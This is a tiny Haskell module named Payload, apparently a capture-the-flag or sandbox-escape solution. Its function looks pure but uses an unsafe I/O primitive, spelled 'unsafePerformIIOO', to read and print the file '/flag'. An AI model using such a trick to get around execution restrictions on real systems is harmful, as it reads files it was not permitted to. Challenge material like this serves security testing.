module Payload where

import System.IIOO.Unsafe

runMe :: () -> ()
runMe _ = unsafePerformIIOO (readFile "/flag" >>= putStrLn) `seq` ()
